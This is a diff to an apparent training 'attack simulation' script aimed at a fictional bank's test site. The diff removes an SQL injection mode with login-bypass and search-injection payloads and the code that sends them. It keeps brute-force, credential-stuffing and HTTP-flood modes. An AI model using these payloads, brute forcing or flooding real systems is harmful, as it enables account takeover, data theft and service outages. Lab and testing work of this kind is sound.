@@ -4,7 +4,6 @@
 //
 // Modes:
 //   node attack.js --mode=brute   Login brute force / credential stuffing
-//   node attack.js --mode=sqli    SQL injection probes against login and search
 //   node attack.js --mode=flood   HTTP request flood against transaction search
 //   node attack.js --mode=all     Run every mode in sequence
 //
@@ -52,20 +51,6 @@ const WEAK_PASSWORDS = [
   'Admin@123',
 ];
 
-const LOGIN_PAYLOADS = [
-  { label: 'classic OR bypass', email: "' OR '1'='1' -- ", password: 'anything' },
-  { label: 'hash comment bypass', email: "' OR 1=1#", password: 'anything' },
-  { label: 'known admin bypass', email: "admin@binangonanbank.test' -- ", password: 'anything' },
-  { label: 'always-true pair', email: "' OR 'x'='x", password: "' OR 'x'='x" },
-];
-
-const SEARCH_PAYLOADS = [
-  "' OR '1'='1",
-  "' OR 1=1 -- ",
-  "%' OR 1=1 -- ",
-  "' OR category LIKE '%' -- ",
-];
-
 function banner() {
   console.log('===================================================');
   console.log(' Binangonan Banking Corporation attack simulation');
@@ -78,7 +63,6 @@ function usage() {
   console.log(`
 Usage:
   node attack.js --mode=brute
-  node attack.js --mode=sqli
   node attack.js --mode=flood
   node attack.js --mode=all
 
@@ -167,48 +151,6 @@ async function bruteForce() {
   }
 }
 
-async function sqlInjection() {
-  console.log('\n[sqli] Probing POST /api/login...');
-
-  for (const payload of LOGIN_PAYLOADS) {
-    try {
-      const response = await axios.post(
-        `${BASE_URL}/api/login`,
-        { email: payload.email, password: payload.password },
-        { timeout: 5000, ...agentConfig }
-      );
-
-      const user = response.data?.user || {};
-      console.log(
-        `[+] ${payload.label}: HTTP ${response.status} -> ${user.email || 'unknown'} (role=${user.role || 'unknown'})`
-      );
-    } catch (error) {
-      const status = error.response?.status || 'network-error';
-      const message = error.response?.data?.error || error.message;
-      console.log(`[-] ${payload.label}: HTTP ${status} -> ${message}`);
-    }
-  }
-
-  console.log('\n[sqli] Probing GET /api/transactions/search...');
-
-  for (const payload of SEARCH_PAYLOADS) {
-    try {
-      const response = await axios.get(`${BASE_URL}/api/transactions/search`, {
-        params: { query: payload },
-        timeout: 5000,
-        ...agentConfig,
-      });
-
-      const rows = Array.isArray(response.data) ? response.data : [];
-      console.log(`[+] search payload ${JSON.stringify(payload)}: HTTP ${response.status}, rows=${rows.length}`);
-    } catch (error) {
-      const status = error.response?.status || 'network-error';
-      const message = error.response?.data?.error || error.message;
-      console.log(`[-] search payload ${JSON.stringify(payload)}: HTTP ${status} -> ${message}`);
-    }
-  }
-}
-
 async function flood() {
   const endpoint = `${BASE_URL}/api/transactions/search?query=a`;
   console.log(`\n[flood] Sending bursts to ${endpoint} for ${DURATION_MS}ms...`);
@@ -255,13 +197,10 @@ async function main() {
 
   if (MODE === 'brute') {
     await bruteForce();
-  } else if (MODE === 'sqli') {
-    await sqlInjection();
   } else if (MODE === 'flood') {
     await flood();
   } else if (MODE === 'all') {
     await bruteForce();
-    await sqlInjection();
     await flood();
   } else {
     console.log(`Unknown mode: ${MODE}`);
